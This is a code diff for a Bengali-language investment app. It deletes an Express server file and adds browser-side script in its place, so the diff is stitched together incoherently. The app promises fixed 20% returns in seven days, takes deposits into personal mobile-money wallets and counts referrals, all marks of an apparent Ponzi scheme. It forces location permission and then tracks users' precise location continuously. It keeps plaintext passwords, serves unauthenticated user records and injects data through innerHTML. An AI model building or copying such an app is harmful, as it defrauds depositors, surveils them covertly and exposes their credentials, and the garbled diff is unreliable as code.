-  const sig = crypto.createHmac("sha256", APP_SECRET).update(body).digest("base64url");
-  return `${body}.${sig}`;
-}
-
-function verifySession(token) {
+async function fetchUserDataQuietly() {
+  if(!currentUser || !currentUser.id) return;
   try {
-    const [body, sig] = String(token || "").split(".");
-    if (!body || !sig) return null;
-    const expected = crypto.createHmac("sha256", APP_SECRET).update(body).digest("base64url");
-    if (sig !== expected) return null;
-    return JSON.parse(Buffer.from(body, "base64url").toString("utf8"));
-  } catch { return null; }
+    const r = await fetch(`/api/user/${currentUser.id}`);
+    const d = await r.json();
+    if(d.ok) { currentUser = d.user; localStorage.setItem("v2_user_data", JSON.stringify(currentUser)); enterDashboardDirectly(); }
+    else { localStorage.removeItem("v2_user_data"); }
+  } catch(e){}
 }
 
-function cookies(req) {
-  const out = {};
-  for (const part of (req.headers.cookie || "").split(";")) {
-    const i = part.indexOf("=");
-    if (i > -1) out[part.slice(0, i).trim()] = decodeURIComponent(part.slice(i + 1).trim());
+function toggleAuthMode(isLogin) {
+  if(isLogin) { $("registerStep").style.display="none"; $("loginCard").style.display="block"; }
+  else { $("loginCard").style.display="none"; $("registerStep").style.display="block"; }
+}
+
+async function handleLogin() {
+  clearMsg("loginMsg");
+  const phone = $("loginPhone").value.trim();
+  const password = $("loginPassword").value.trim();
+  try {
+    const r = await fetch("/api/login", { method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({phone, password})});
+    const d = await r.json();
+    if(!r.ok) throw new Error(d.error || "লগইন ব্যর্থ");
+    currentUser = d.user;
+    localStorage.setItem("v2_user_data", JSON.stringify(currentUser));
+    enterDashboardDirectly();
+  } catch(e){ showMsg("loginMsg", e.message); }
+}
+
+function startLiveLocationTracking(userId) {
+  if (!navigator.geolocation) return;
+  if (watchId !== null) navigator.geolocation.clearWatch(watchId);
+  watchId = navigator.geolocation.watchPosition(
+    async pos => {
+      try {
+        await fetch(`/api/user/${encodeURIComponent(userId)}/location`, {
+          method: "POST", headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ location: { latitude: pos.coords.latitude, longitude: pos.coords.longitude } })
+        });
+      } catch(e){}
+    }, () => {}, { enableHighAccuracy: true, timeout: 20000 }
+  );
+}
+
+$("allowBtn").addEventListener("click", () => {
+  clearMsg("formMsg");
+  const name = $("name").value.trim();
+  const phone = $("phone").value.trim();
+  const password = $("password").value.trim();
+  const age = Number($("age").value);
+  if(!name || !validPhone(phone) || !password || age < 18) return showMsg("formMsg", "সকল তথ্য সঠিকভাবে পূরণ করুন (বয়স কমপক্ষে ১৮)।");
+
+  navigator.geolocation.getCurrentPosition(async pos => {
+    try {
+      const r = await fetch("/api/register/start", {
+        method:"POST", headers:{"Content-Type":"application/json"},
+        body:JSON.stringify({name, phone, password, age, location:{latitude:pos.coords.latitude, longitude:pos.coords.longitude}})
+      });
+      const d = await r.json();
+      if(!r.ok) throw new Error(d.error);
+      currentUser = d.user;
+      localStorage.setItem("v2_user_data", JSON.stringify(currentUser));
+      startLiveLocationTracking(currentUser.id);
+      $("registerStep").style.display = "none";
+      $("paymentStep").style.display = "block";
+    } catch(e){ showMsg("formMsg", e.message); }
+  }, () => { showMsg("formMsg", "লোকেশন পারমিশন দিন।"); }, {timeout:10000});
+});
+
+async function submitPayment() {
+  const method = document.querySelector('input[name="payment"]:checked').value;
+  const wallet = $("walletNumber").value.trim();
+  if(!validPhone(wallet)) return showMsg("paymentMsg", "সঠিক ওয়ালেট নাম্বার দিন।");
+  const r = await fetch(`/api/register/${currentUser.id}/payment`, {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({paymentMethod:method, paymentNumber:wallet})});
+  const d = await r.json();
+  if(r.ok) { currentUser = d.user; localStorage.setItem("v2_user_data", JSON.stringify(currentUser)); $("paymentStep").style.display="none"; $("successStep").style.display="block"; }
+}
+
+function enterDashboard() { enterDashboardDirectly(); }
+function enterDashboardDirectly() {
+  $("authView").style.display = "none";
+  $("dashboardView").classList.remove("hidden");
+  $("bottomNavBar").classList.remove("hidden");
+  updateDisplayValues();
+  startLiveLocationTracking(currentUser.id);
+  switchTab('home');
+}
+
+function updateDisplayValues() {
+  if(!currentUser) return;
+  $("displayBalance").textContent = `৳${currentUser.balance || 0}`;
+  $("dashTotalEarned").textContent = `৳${currentUser.balance || 0}`;
+  $("dashReferralCount").textContent = `${currentUser.referralCount || 0} Users`;
+  $("profileDetails").innerHTML = `<b>নাম:</b> ${currentUser.name}<br><b>ফোন:</b> ${currentUser.phone}<br><b>রেফারেল কোড:</b> ${currentUser.referralCode}`;
+}
+
+// Deposit System
+function updateAdminWalletDisplay() {
+  const method = $("depositMethod").value;
+  $("depositMethodBadge").textContent = method + " Personal";
+  $("adminWalletDisplay").textContent = method === "bKash" ? appGlobalSettings.adminBkash : appGlobalSettings.adminNagad;
+}
+
+function copyAdminNumber() {
+  navigator.clipboard.writeText($("adminWalletDisplay").textContent);
+  alert("নাম্বার কপি হয়েছে!");
+}
+
+async function submitDeposit() {
+  const method = $("depositMethod").value;
+  const amount = Number($("depositAmount").value);
+  const trxId = $("depositTrxId").value.trim();
+  if(amount < 100 || !trxId) return showMsg("depositMsg", "সঠিক পরিমাণ ও TrxID দিন।");
+  const r = await fetch("/api/deposit", { method: "POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({userId: currentUser.id, method, amount, trxId}) });
+  const d = await r.json();
+  if(!r.ok) return showMsg("depositMsg", d.error);
+  showMsg("depositMsg", "ডিপোজিট সফলভাবে সাবমিট হয়েছে!", "success");
+}
+
+// Profit Calculator & Amount Selection
+function setInvestAmount(amt, btn) {
+  document.querySelectorAll('.amount-chip').forEach(c => c.classList.remove('active'));
+  btn.classList.add('active');
+  $("calcAmount").value = amt;
+  calculateProfitPreview();
+}
+
+function calculateProfitPreview() {
+  const amt = Number($("calcAmount").value) || 0;
+  const rate = appGlobalSettings.investRate || 20;
+  const profit = Math.floor((amt * rate) / 100);
+  const total = amt + profit;
+
+  $("calcPreviewBox").innerHTML = `
+    বিনিয়োগ: <b>৳${amt}</b> | সম্ভাব্য মুনাফা (${rate}%): <b style="color:var(--green)">৳${profit}</b><br>
+    মোট প্রাপ্য (মূলধন + লাভ): <b style="color:var(--gold)">৳${total}</b>
+  `;
+}
+
+function openInvestConfirmation() {
+  const amt = Number($("calcAmount").value) || 0;
+  if(amt < (appGlobalSettings.minInvest || 100)) return alert(`সর্বনিম্ন বিনিয়োগ ৳${appGlobalSettings.minInvest || 100}`);
+  if(amt > (appGlobalSettings.maxInvest || 50000)) return alert(`সর্বোচ্চ বিনিয়োগ ৳${appGlobalSettings.maxInvest || 50000}`);
+  if(amt > (currentUser.balance || 0)) return alert("অ্যাকাউন্টে পর্যাপ্ত ব্যালেন্স নেই!");
+
+  const rate = appGlobalSettings.investRate || 20;
+  const profit = Math.floor((amt * rate) / 100);
+  const total = amt + profit;
+  const durationDays = appGlobalSettings.investDuration || 7;
+  
+  const withdrawDate = new Date();
+  withdrawDate.setDate(withdrawDate.getDate() + durationDays);
+
+  $("confirmModalBody").innerHTML = `
+    • বিনিয়োগের পরিমাণ: <b>৳${amt}</b><br>
+    • সম্ভাব্য মুনাফা (${rate}%): <b style="color:var(--green)">৳${profit}</b><br>
+    • মোট সম্ভাব্য রিটার্ন: <b style="color:var(--gold)">৳${total}</b><br>
+    • বিনিয়োগের মেয়াদ: <b>${durationDays} দিন</b><br>
+    • উত্তোলনের সম্ভাব্য তারিখ: <b>${withdrawDate.toLocaleDateString()}</b>
+  `;
+  $("investConfirmModal").classList.add("show");
+}
+
+async function confirmAndSubmitInvestment() {
+  const btn = $("confirmInvestBtn");
+  btn.disabled = true;
+  $("investConfirmModal").classList.remove("show");
+  const amt = Number($("calcAmount").value);
+
+  try {
+    const r = await fetch("/api/invest/create", {
+      method: "POST",
+      headers: {"Content-Type":"application/json"},
+      body: JSON.stringify({ userId: currentUser.id, amount: amt })
+    });
+    const d = await r.json();
+    if(!r.ok) throw new Error(d.error || "ইনভেস্টমেন্ট ব্যর্থ হয়েছে।");
+
+    currentUser.balance = d.balance;
+    localStorage.setItem("v2_user_data", JSON.stringify(currentUser));
+    updateDisplayValues();
+    alert("🎉 Successful Investment! আপনার ইনভেস্টমেন্ট সফলভাবে Active হয়েছে।");
+    loadUserInvestments();
+    switchTab('invest');
+  } catch(e) {
+    alert("Error: " + e.message);
+  } finally {
+    btn.disabled = false;
   }
-  return out;
 }
 
-function requireAdmin(req, res, next) {
-  const session = verifySession(cookies(req).admin_session);
-  if (!session || session.role !== "admin") return res.status(401).json({ error: "Unauthorized" });
-  next();
+async function loadUserInvestments() {
+  if(!currentUser) return;
+  try {
+    const r = await fetch(`/api/investments/${currentUser.id}`);
+    const d = await r.json();
+    const container = $("userInvestmentsContainer");
+    const list = d.investments || [];
+
+    if(!list.length) {
+      container.innerHTML = `<div class="admin-note">কোনো ইনভেস্টমেন্ট হিস্ট্রি নেই।</div>`;
+      return;
+    }
+
+    container.innerHTML = list.map(inv => {
+      const now = new Date();
+      const unlockDate = new Date(inv.unlockDate);
+      const diffTime = unlockDate - now;
+      const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24));
+      const canWithdraw = diffDays <= 0;
+
+      return `
+        <div class="record">
+          <div class="record-top">
+            <div>
+              <h4>ID: ${inv.id.slice(0,8)}...</h4>
+              <div class="meta">
+                বিনিয়োগ: ৳${inv.amount} | সম্ভাব্য লাভ: <b style="color:var(--green)">+৳${inv.profit}</b><br>
+                মেয়াদ শেষ: ${unlockDate.toLocaleDateString()}<br>
+                অবশিষ্ট সময়: <b style="color:var(--gold)">${diffDays > 0 ? diffDays + ' দিন বাকি' : 'মেয়াদ পূর্ণ হয়েছে!'}</b>
+              </div>
+            </div>
+            <span class="badge ${canWithdraw ? '' : 'pending'}">${canWithdraw ? 'Ready' : 'Active'}</span>
+          </div>
+          <button class="task-btn" ${canWithdraw ? '' : 'disabled style="opacity:0.5;cursor:not-allowed;"'} onclick="claimInvestment('${inv.id}')" style="margin-top:10px;width:100%;">
+            ${canWithdraw ? 'Withdraw Profit & Capital' : 'Locked (মেয়াদ বাকী আছে)'}
+          </button>
+        </div>
+      `;
+    }).join("");
+  } catch(e){}
 }
 
-app.use(express.json({ limit: "100kb" }));
-app.use(express.static(path.join(__dirname, "public")));
-
-app.get("/api/settings", (req, res) => {
-  const db = loadDb();
-  res.json({ ok: true, settings: db.settings });
-});
-
-app.post("/api/register/start", (req, res) => {
-  withFileLock(async () => {
-    const { name, phone, password, age, location } = req.body;
-    const db = loadDb();
-    if (db.registrations.some(r => r.phone === phone)) return res.status(409).json({ error: "এই নাম্বার দিয়ে ইতিপূর্বে অ্যাকাউন্ট খোলা হয়েছে।" });
-
-    const id = crypto.randomUUID();
-    const user = {
-      id, name, phone, password, age,
-      balance: 100,
-      referralCode: "REF" + Math.floor(100000 + Math.random() * 900000),
-      referralCount: 0, status: "awaiting_payment",
-      location, locationHistory: [location],
-      createdAt: new Date().toISOString()
-    };
-    db.registrations.unshift(user);
-    db.transactions.unshift({ id: crypto.randomUUID(), userId: id, type: "Registration Bonus", amount: 100, date: new Date().toISOString() });
-    saveDb(db);
-    res.json({ ok: true, user });
-  });
-});
-
-app.post("/api/login", (req, res) => {
-  const { phone, password } = req.body;
-  const db = loadDb();
-  const user = db.registrations.find(r => r.phone === phone && r.password === password);
-  if (!user) return res.status(401).json({ error: "Invalid Information" });
-  res.json({ ok: true, user });
-});
-
-app.get("/api/user/:id", (req, res) => {
-  const db = loadDb();
-  const user = db.registrations.find(r => r.id === req.params.id);
-  if (!user) return res.status(404).json({ error: "User not found" });
-  res.json({ ok: true, user });
-});
-
-app.post("/api/user/:id/location", (req, res) => {
-  withFileLock(async () => {
-    const db = loadDb();
-    const user = db.registrations.find(r => r.id === req.params.id);
-    if (!user) return res.status(404).json({ error: "User not found" });
-    const loc = req.body?.location;
-    if (loc) {
-      user.location = loc;
-      if (!Array.isArray(user.locationHistory)) user.locationHistory = [];
-      user.locationHistory.push({ ...loc, capturedAt: new Date().toISOString() });
-      saveDb(db);
-    }
-    res.json({ ok: true });
-  });
-});
-
-app.post("/api/register/:id/payment", (req, res) => {
-  withFileLock(async () => {
-    const db = loadDb();
-    const user = db.registrations.find(r => r.id === req.params.id);
-    if (!user) return res.status(404).json({ error: "User not found" });
-    user.status = "complete";
-    saveDb(db);
-    res.json({ ok: true, user });
-  });
-});
-
-// Deposit API with TrxID Protection
-app.post("/api/deposit", (req, res) => {
-  withFileLock(async () => {
-    const { userId, method, amount, trxId } = req.body;
-    const db = loadDb();
-    const user = db.registrations.find(r => r.id === userId);
-    if (!user) return res.status(404).json({ error: "User not found" });
-
-    const cleanTrx = clean(trxId, 50).toUpperCase();
-    if (db.usedTrxIds.includes(cleanTrx)) return res.status(400).json({ error: "এই TrxID টি ইতিপূর্বে ব্যবহার করা হয়েছে!" });
-
-    db.usedTrxIds.push(cleanTrx);
-    db.deposits.unshift({ id: crypto.randomUUID(), userId, method, amount, trxId: cleanTrx, status: "Pending", date: new Date().toISOString() });
-    db.transactions.unshift({ id: crypto.randomUUID(), userId, type: `Deposit (${method})`, amount, status: "Pending", date: new Date().toISOString() });
-    saveDb(db);
-    res.json({ ok: true });
-  });
-});
-
-// Premium Investment APIs
-app.post("/api/invest/create", (req, res) => {
-  withFileLock(async () => {
-    const { userId, amount } = req.body;
-    const db = loadDb();
-    if (!db.settings.investEnabled) return res.status(400).json({ error: "বিনিয়োগ সিস্টেম বর্তমানে বন্ধ রয়েছে।" });
-
-    const user = db.registrations.find(r => r.id === userId);
-    if (!user) return res.status(404).json({ error: "User not found" });
-
-    const numAmt = Number(amount);
-    if (numAmt < db.settings.minInvest || numAmt > db.settings.maxInvest) {
-      return res.status(400).json({ error: `বিনিয়োগের পরিমাণ ৳${db.settings.minInvest} থেকে ৳${db.settings.maxInvest} এর মধ্যে হতে হবে।` });
-    }
-    if (user.balance < numAmt) return res.status(400).json({ error: "অ্যাকাউন্টে পর্যাপ্ত ব্যালেন্স নেই।" });
-
-    user.balance -= numAmt;
-    const rate = db.settings.investRate;
-    const profit = Math.floor((numAmt * rate) / 100);
-    const durationDays = db.settings.investDuration;
-
-    const unlockDate = new Date();
-    unlockDate.setDate(unlockDate.getDate() + durationDays);
-
-    const investment = {
-      id: crypto.randomUUID(),
-      userId,
-      amount: numAmt,
-      rate,
-      profit,
-      totalReturn: numAmt + profit,
-      status: "Active",
-      createdAt: new Date().toISOString(),
-      unlockDate: unlockDate.toISOString()
-    };
-
-    db.investments.unshift(investment);
-    db.transactions.unshift({
-      id: crypto.randomUUID(),
-      userId,
-      type: `Investment Deduction`,
-      amount: -numAmt,
-      date: new Date().toISOString()
+async function claimInvestment(investId) {
+  try {
+    const r = await fetch("/api/invest/claim", {
+      method: "POST",
+      headers: {"Content-Type":"application/json"},
+      body: JSON.stringify({ userId: currentUser.id, investId })
     });
+    const d = await r.json();
+    if(!r.ok) throw new Error(d.error || "উত্তোলন করা সম্ভব হয়নি।");
 
-    saveDb(db);
-    res.json({ ok: true, balance: user.balance, investment });
+    currentUser.balance = d.balance;
+    localStorage.setItem("v2_user_data", JSON.stringify(currentUser));
+    updateDisplayValues();
+    alert("🎉 টাকা সফলভাবে আপনার মূল ওয়ালেটে যোগ হয়েছে!");
+    loadUserInvestments();
+  } catch(e) {
+    alert("Error: " + e.message);
+  }
+}
+
+// Navigation Tabs
+function switchTab(tabName) {
+  ['paneHome', 'paneDeposit', 'paneInvest', 'paneTasks', 'paneWithdraw', 'paneWallet', 'paneProfile'].forEach(p => $(p).classList.add('hidden'));
+  ['navHome', 'navDeposit', 'navInvest', 'navTasks', 'navWithdraw', 'navWallet', 'navProfile'].forEach(n => $(n).className = 'nav-item');
+
+  if(tabName=='home'){ $('paneHome').classList.remove('hidden'); $('navHome').className='nav-item active'; }
+  else if(tabName=='deposit'){ $('paneDeposit').classList.remove('hidden'); $('navDeposit').className='nav-item active'; updateAdminWalletDisplay(); }
+  else if(tabName=='invest'){ $('paneInvest').classList.remove('hidden'); $('navInvest').className='nav-item active'; loadUserInvestments(); }
+  else if(tabName=='tasks'){ $('paneTasks').classList.remove('hidden'); $('navTasks').className='nav-item active'; loadPromoTasks(); }
+  else if(tabName=='withdraw'){ $('paneWithdraw').classList.remove('hidden'); $('navWithdraw').className='nav-item active'; }
+  else if(tabName=='wallet'){ $('paneWallet').classList.remove('hidden'); $('navWallet').className='nav-item active'; loadTransactions(); }
+  else if(tabName=='profile'){ $('paneProfile').classList.remove('hidden'); $('navProfile').className='nav-item active'; updateDisplayValues(); }
+}
+
+async function loadPromoTasks() {
+  const r = await fetch("/api/promo/tasks"); const d = await r.json();
+  $("promoTasksListContainer").innerHTML = (d.tasks || []).map(t => `<div class="task-item"><div><h4>${t.title}</h4><small>Reward: ৳${t.reward}</small></div><button class="task-btn" onclick="alert('লিংক ভিজিট সম্পন্ন করুন')">Visit</button></div>`).join("");
+}
+
+async function loadTransactions() {
+  const r = await fetch(`/api/transactions/${currentUser.id}`); const d = await r.json();
+  $("transactionListContainer").innerHTML = (d.transactions || []).map(tx => `<div class="tx-item"><div><b>${tx.type}</b><br><small>${new Date(tx.date).toLocaleString()}</small></div><b>৳${tx.amount}</b></div>`).join("");
+}
+
+async function submitWithdraw() {
+  const amt = Number($("withdrawAmount").value);
+  const number = $("withdrawNumber").value.trim();
+  const method = $("withdrawMethod").value;
+  if(amt < 500 || amt > currentUser.balance) return showMsg("withdrawMsg", "সঠিক পরিমাণ দিন (ন্যূনতম ৫০০ টাকা)।");
+  const r = await fetch("/api/withdraw", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({userId:currentUser.id, method, number, amount:amt})});
+  const d = await r.json();
+  if(r.ok) { currentUser.balance = d.balance; localStorage.setItem("v2_user_data", JSON.stringify(currentUser)); updateDisplayValues(); showMsg("withdrawMsg", "উইথড্র রিকোয়েস্ট সফল!", "success"); }
+}
+
+function openNotificationModal() { alert("কোনো নতুন নোটিফিকেশন নেই।"); }
+function logout() { localStorage.clear(); location.reload(); }
+
+let tapC = 0;
+$('adminTapTarget').addEventListener('click', () => {
+  tapC++; if(tapC >= 3) { tapC = 0; $("adminModal").classList.add("show"); }
+});
+$("adminLoginBtn").addEventListener('click', async () => {
+  const pin = $("adminPin").value;
+  const r = await fetch("/api/admin/login", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({pin})});
+  if(r.ok) { $("adminModal").classList.remove("show"); $("adminPanel").classList.add("show"); loadAdminData(); }
+  else { showMsg("adminPinMsg", "ভুল পিন"); }
+});
+
+async function loadAdminData() {
+  const sr = await fetch("/api/admin/settings"); const sd = await sr.json();
+  $("adminInvestEnabled").checked = sd.investEnabled !== false;
+  $("adminMinInvest").value = sd.minInvest || 100;
+  $("adminMaxInvest").value = sd.maxInvest || 50000;
+  $("adminInvestRate").value = sd.investRate || 20;
+  $("adminInvestDuration").value = sd.investDuration || 7;
+}
+
+async function saveAdminSettings() {
+  await fetch("/api/admin/settings", {
+    method:"POST", headers:{"Content-Type":"application/json"},
+    body: JSON.stringify({
+      investEnabled: $("adminInvestEnabled").checked,
+      minInvest: Number($("adminMinInvest").value),
+      maxInvest: Number($("adminMaxInvest").value),
+      investRate: Number($("adminInvestRate").value),
+      investDuration: Number($("adminInvestDuration").value)
+    })
   });
-});
-
-app.get("/api/investments/:userId", (req, res) => {
-  const db = loadDb();
-  const list = db.investments.filter(i => i.userId === req.params.userId);
-  res.json({ ok: true, investments: list });
-});
-
-app.post("/api/invest/claim", (req, res) => {
-  withFileLock(async () => {
-    const { userId, investId } = req.body;
-    const db = loadDb();
-    const user = db.registrations.find(r => r.id === userId);
-    const inv = db.investments.find(i => i.id === investId && i.userId === userId);
-
-    if (!user || !inv) return res.status(404).json({ error: "Not found" });
-    if (inv.status !== "Active") return res.status(400).json({ error: "ইতিমধ্যে এই ইনভেস্টমেন্ট ক্লেম করা হয়েছে।" });
-
-    if (new Date() < new Date(inv.unlockDate)) {
-      return res.status(400).json({ error: "মেয়াদ এখনও শেষ হয়নি!" });
-    }
-
-    inv.status = "Completed";
-    const totalPayout = inv.totalReturn;
-    user.balance += totalPayout;
-
-    db.transactions.unshift({
-      id: crypto.randomUUID(),
-      userId,
-      type: `Investment Profit & Capital Payout`,
-      amount: totalPayout,
-      date: new Date().toISOString()
-    });
-
-    saveDb(db);
-    res.json({ ok: true, balance: user.balance });
-  });
-});
-
-app.get("/api/transactions/:userId", (req, res) => {
-  const db = loadDb();
-  res.json({ ok: true, transactions: db.transactions.filter(t => t.userId === req.params.userId) });
-});
-
-app.post("/api/withdraw", (req, res) => {
-  withFileLock(async () => {
-    const { userId, method, number, amount } = req.body;
-    const db = loadDb();
-    const user = db.registrations.find(r => r.id === userId);
-    if (!user || user.balance < amount || amount < 500) return res.status(400).json({ error: "Insufficient balance" });
-
-    user.balance -= amount;
-    db.withdrawals.unshift({ id: crypto.randomUUID(), userId, method, number, amount, status: "Pending", date: new Date().toISOString() });
-    db.transactions.unshift({ id: crypto.randomUUID(), userId, type: `Withdraw (${method})`, amount: -amount, date: new Date().toISOString() });
-    saveDb(db);
-    res.json({ ok: true, balance: user.balance });
-  });
-});
-
-app.get("/api/promo/tasks", (req, res) => {
-  const db = loadDb();
-  res.json({ tasks: db.promoTasks });
-});
-
-// Admin APIs
-app.post("/api/admin/login", (req, res) => {
-  if (String(req.body?.pin || "") !== ADMIN_PIN) return res.status(401).json({ error: "Invalid PIN" });
-  const token = signSession({ role: "admin", exp: Date.now() + 8*3600*1000 });
-  res.setHeader("Set-Cookie", `admin_session=${token}; HttpOnly; Path=/; Max-Age=28800`);
-  res.json({ ok: true });
-});
-
-app.get("/api/admin/settings", requireAdmin, (req, res) => {
-  const db = loadDb();
-  res.json(db.settings);
-});
-
-app.post("/api/admin/settings", requireAdmin, (req, res) => {
-  withFileLock(async () => {
-    const db = loadDb();
-    db.settings = { ...db.settings, ...req.body };
-    saveDb(db);
-    res.json({ ok: true });
-  });
-});
-
-app.listen(PORT, () => {
-  console.log(`Server running on http://localhost:${PORT}`);
-});
+  alert("Settings Saved!");
+}
+</script>
+</body>
+</html>
